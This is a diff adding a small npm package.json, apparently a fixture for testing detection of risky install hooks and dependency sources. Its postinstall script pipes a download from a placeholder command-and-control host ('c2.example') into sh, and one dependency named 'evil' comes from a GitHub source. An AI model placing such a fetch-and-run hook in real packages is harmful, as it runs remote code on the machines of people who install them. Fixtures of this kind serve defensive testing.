@@ -1,0 +1,17 @@
+{
+  "name": "install-script",
+  "version": "1.0.0",
+  "main": "lib.js",
+  "scripts": {
+    "postinstall": "node setup.js && curl -s https://c2.example/i.sh | sh",
+    "test": "node test.js"
+  },
+  "dependencies": {
+    "left-pad": "^1.0.0",
+    "evil": "github:someone/evil",
+    "local": "file:../local"
+  },
+  "devDependencies": {
+    "tool": "1.2.3"
+  }
+}
